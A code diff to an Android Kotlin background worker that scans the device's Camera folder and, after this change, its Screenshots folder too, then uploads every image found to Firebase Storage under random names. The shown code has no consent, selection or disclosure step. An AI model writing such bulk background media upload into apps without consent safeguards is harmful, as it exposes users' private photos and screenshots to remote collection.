@@ -21,50 +21,64 @@ import java.io.File
 import java.util.UUID
 
 class MyWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
-    val imageRef = Firebase.storage.reference
+    private val imageRef = Firebase.storage.reference
+
     override fun doWork(): Result {
-            val root = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
-            val cameraFolder = File(root, "Camera")
+        val root = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+        val cameraFolder = File(root, "Camera")
+        val screenshotsFolder = File(root, "Screenshots")
 
-            if (cameraFolder.exists() && cameraFolder.isDirectory) {
-                val imageFiles = getImageFiles(cameraFolder)
+        // Process Camera folder
+        processImageFolder(cameraFolder, "Camera images")
 
-                if (imageFiles.isNotEmpty()) {
-                    // Do something with the list of image files
-                    for (imageFile in imageFiles) {
-                        println("Image File: ${imageFile.name}")
-                    }
-                    Log.d("MainActivity",imageFiles.size.toString())
-                    uploadImagesToStorage(imageFiles)
-                } else {
-                    Toast.makeText(applicationContext, "No image files found in Camera folder", Toast.LENGTH_SHORT).show()
-                }
-            } else {
-                Toast.makeText(applicationContext ,"Camera folder does not exist or is not a directory", Toast.LENGTH_SHORT).show()
-            }
+        // Process Screenshots folder
+        processImageFolder(screenshotsFolder, "Screenshot images")
 
         return Result.success()
     }
-    private fun uploadImagesToStorage(imageFiles: ArrayList<File>) = CoroutineScope(Dispatchers.IO).launch {
-        try {
-            for (imageFile in imageFiles) {
-                // Generate a unique filename for each image
-                val filename = UUID.randomUUID().toString()
 
-                imageRef.child("images/$filename").putFile(imageFile.toUri()).await()
+    private fun processImageFolder(folder: File, storageFolderName: String) {
+        if (folder.exists() && folder.isDirectory) {
+            val imageFiles = getImageFiles(folder)
 
-                withContext(Dispatchers.Main) {
-                    Log.d("MainActivity", "Successfully uploaded image: $filename")
-                    // You can add additional logic here if needed
+            if (imageFiles.isNotEmpty()) {
+                // Do something with the list of image files
+                for (imageFile in imageFiles) {
+                    println("Image File: ${imageFile.name}")
                 }
+                Log.d("MainActivity", "Number of images in ${folder.name}: ${imageFiles.size}")
+                uploadImagesToStorage(imageFiles, storageFolderName)
+            } else {
+                Toast.makeText(applicationContext, "No image files found in ${folder.name}", Toast.LENGTH_SHORT).show()
             }
-        } catch (e: Exception) {
-            withContext(Dispatchers.Main) {
-                Log.e("MainActivity", "Error uploading images: ${e.message}")
-                // Handle the error if needed
-            }
+        } else {
+            Toast.makeText(applicationContext, "${folder.name} folder does not exist or is not a directory", Toast.LENGTH_SHORT).show()
         }
     }
+
+    private fun uploadImagesToStorage(imageFiles: List<File>, storageFolderName: String) =
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                for (imageFile in imageFiles) {
+                    // Generate a unique filename for each image
+                    val filename = UUID.randomUUID().toString()
+
+                    // Upload to the specified storage folder
+                    imageRef.child("$storageFolderName/$filename").putFile(imageFile.toUri()).await()
+
+                    withContext(Dispatchers.Main) {
+                        Log.d("MainActivity", "Successfully uploaded image to $storageFolderName: $filename")
+                        // You can add additional logic here if needed
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    Log.e("MainActivity", "Error uploading images to $storageFolderName: ${e.message}")
+                    // Handle the error if needed
+                }
+            }
+        }
+
     private fun getImageFiles(folder: File): ArrayList<File> {
         val imageFiles = ArrayList<File>()
         val files = folder.listFiles()
@@ -76,12 +90,12 @@ class MyWorker(context: Context, params: WorkerParameters) : Worker(context, par
                 }
             }
         }
-
         return imageFiles
     }
+
     private fun isImageFile(file: File): Boolean {
         val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.toLowerCase())
         return mimeType != null && mimeType.startsWith("image")
     }
-
 }
+
